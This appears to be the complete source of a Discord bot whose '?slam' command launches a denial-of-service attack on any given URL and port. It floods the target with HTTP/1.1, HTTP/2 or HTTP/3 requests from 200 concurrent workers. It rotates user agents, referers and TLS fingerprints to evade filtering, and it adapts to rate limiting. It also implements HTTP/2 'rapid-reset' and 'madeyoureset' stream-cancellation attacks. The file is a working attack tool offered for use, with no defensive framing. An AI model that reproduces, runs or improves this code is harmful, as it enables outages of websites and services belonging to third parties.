import { Client, GatewayIntentBits, EmbedBuilder } from "discord.js";
import https from 'https';
import http2 from 'http2';
import { URL } from "url";
import { Client as Socket } from 'undici';
import chalk from 'chalk';

const TOKEN = "YOUR_DISCORD_BOT_TOKEN";
const PREFIX = "?"

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

client.once("ready", () => {
  console.log(`Bot started as ${client.user.tag}`);
});

client.on("messageCreate", (message) => {
  if (message.author.bot) return;

  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === "help") { 
    message.channel.send(PREFIX + "slam")
  }

  if (command === "slam") {
        const [ipStr, portStr, timeStr, methodStr, resetStr, delayStr] = args;
        if (ipStr || portStr || timeStr || resetStr) {
            let ip = ipStr;
            let port = Number(portStr);
            let time = Number(timeStr);
            let method = methodStr;
            let reset = resetStr
            let delay = delayStr
            slam(ip, port, method, time, reset, delay)
            message.channel.send("Slammer Started on Address : " + ip + " :)")
        }else {
            message.channel.send("[link] [port] [time ( in minutes ) ] [method (1,2,3) ] [reset mode ( none, rapid-reset )] [delay mode ( yes or nothing)]");
        }
   }
});

async function slam(link, port, method, time, reset, delay) {  

if (!reset) { 
    reset = "none"
}
    
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36"
];

const TLS_PROFILES = [
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384'
    },
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384:P-521'
    }
];

const BURST_CONFIG = {
    requestsPerBurst: 1500,
    thinkTimeMs: 0,
    jitterMs: 0,
};

const REFERERS = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://www.yahoo.com/",
];

const ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/json, text/plain, */*",
];

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const getRandomTlsProfile = () => getRandomElement(TLS_PROFILES);

const parsedUrl = new URL(link);
const target = {
    protocol: method,
    host: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    port: port,
};
const targetUrl = `https://${target.host}:${target.port}`;

const durationMs = time * 60 * 1000;
const concurrency = 200;
const attackMode = reset;

let isRunning = true;
let activeProtocols = [];
const workerDelays = new Array(concurrency).fill(0);

async function runStandardWorker(workerId, Socket, protocolKey) {
    let requestsInBurst = 0;
    const protocolLabel = protocolKey.toUpperCase();

    const sendRequest = async () => {
        if (!isRunning) return;

        if (delay && workerDelays[workerId] > 0) {
            await new Promise(resolve => setTimeout(resolve, workerDelays[workerId]));
        }

        const headers = { 'User-Agent': getRandomElement(USER_AGENTS), 'Accept': getRandomElement(ACCEPT_HEADERS), 'Referer': getRandomElement(REFERERS) };
        const startTime = process.hrtime();

        try {
            const { statusCode, body } = await Socket.request({
                path: target.path,
                method: 'GET',
                headers,
            });

            for await (const chunk of body) {}

            const diff = process.hrtime(startTime);
            const latencyMs = (diff[0] * 1e9 + diff[1]) / 1e6;

            if (delay) {
                switch (statusCode) {
                    case 401: case 403: case 429: case 431: case 451:
                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 150);
                        break;
                    case 400: case 406: case 412: case 422:
                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 75);
                        break;
                    default:
                        if (statusCode < 400) {
                             workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
                        }
                }
            }
        } catch (err) {
        } finally {
            scheduleNext();
        }
    };
    
    const scheduleNext = () => {
        if (!isRunning) return;
        requestsInBurst++;
        if (requestsInBurst >= BURST_CONFIG.requestsPerBurst) {
            requestsInBurst = 0;
            const thinkTime = BURST_CONFIG.thinkTimeMs + (Math.random() * BURST_CONFIG.jitterMs);
            setTimeout(sendRequest, thinkTime);
        } else {
            setImmediate(sendRequest);
        }
    };
    
    sendRequest();
}

function startHttp2AttackWorker() {
    if (!isRunning) return;
    const Socket = http2.connect(targetUrl, {
        rejectUnauthorized: false,
        ...getRandomTlsProfile()
    });

    const reconnect = () => {
        if (!Socket.destroyed) Socket.destroy();
        if (isRunning) setTimeout(startHttp2AttackWorker, 100);
    };

    Socket.on('goaway', reconnect);
    Socket.on('error', reconnect);
    Socket.on('close', reconnect);

    Socket.on('connect', () => {
        for (let i = 0; i < 20; i++) { 
            if (attackMode === 'rapid-reset') sendRapidReset(Socket);
            if (attackMode === 'madeyoureset') sendMadeYouReset(Socket);
        }
    });
}

function sendRapidReset(Socket) {
    if (!isRunning || Socket.destroyed || Socket.closing) return;
    const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    const stream = Socket.request(headers);

    setImmediate(() => {
        if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
    });
}

function sendMadeYouReset(Socket) {
    if (!isRunning || Socket.destroyed || Socket.closing) return;
    const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    const stream = Socket.request(headers);

    setImmediate(() => {
        if (stream.destroyed) return;
        try {
            const remoteWindowSize = stream.state.remoteWindowSize;
            if (remoteWindowSize > 0) {
                const oversizedPayload = Buffer.alloc(remoteWindowSize + 1);
                stream.end(oversizedPayload);
            } else {
                stream.end();
            }
        } catch (e) {
            if (!stream.destroyed) stream.destroy();
        }
    });
}

    console.log(chalk.yellow(`Link: ${link} | Trajanje: ${time} min | Threadovi: 200 | Napad: ${attackMode}`));

    if (attackMode !== 'none') {
        activeProtocols = ['h2'];
    } else if (method) {
        const protocolMap = { '1.1': 'h1', '2': 'h2', '3': 'h3' };
        activeProtocols = method.split(',').map(p => protocolMap[p.trim()]).filter(Boolean);
        if (activeProtocols.length === 0) {
            throw new Error('False protokol. koristite "1.1", "2" ili "3".');
        }
    } else {
        let detected = new Set();
        await new Promise(resolve => {
            const req = https.request({
                method: 'HEAD', host: target.host, port: target.port, path: '/',
                rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'], ...getRandomTlsProfile()
            }, res => {
                const altSvc = res.headers['alt-svc'];
                if (altSvc && altSvc.includes('h3')) detected.add('h3');
                res.socket.destroy();
                resolve();
            });
            req.on('socket', socket => {
                socket.on('secureConnect', () => {
                    const alpn = socket.alpnProtocol;
                    if (alpn === 'h2') detected.add('h2');
                    else detected.add('h1');
                });
            });
            req.on('error', () => { detected.add('h1'); resolve(); });
            req.end();
        });
        activeProtocols = Array.from(detected);
        if (activeProtocols.length === 0) activeProtocols.push('h1');
    }

    const workerCounts = {};
    if (attackMode === 'none' && activeProtocols.length > 0) {
        const concPerProtocol = Math.floor(concurrency / activeProtocols.length);
        activeProtocols.forEach(p => workerCounts[p] = concPerProtocol);
        let remainder = concurrency % activeProtocols.length;
        for (let i = 0; i < remainder; i++) {
            workerCounts[activeProtocols[i]]++;
        }
    } else {
        workerCounts['h2'] = concurrency;
    }
    
    let workerId = 0;
    for (const protocolKey in workerCounts) {
        const count = workerCounts[protocolKey];
        for (let i = 0; i < count; i++) {
            if (attackMode !== 'none') {
                startHttp2AttackWorker();
            } else {
                let Kita;
                if (protocolKey === 'h3') {
                    Kita = new Socket(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
                } else if (protocolKey === 'h2') {
                    Kita = new Socket(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
                } else {
                     Kita = new Socket(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() }, pipelining: 1 });
                }
                runStandardWorker(workerId++, Socket, protocolKey);
            }
        }
    }
    setTimeout(() => {
        isRunning = false;
    }, durationMs);
}

client.login(TOKEN);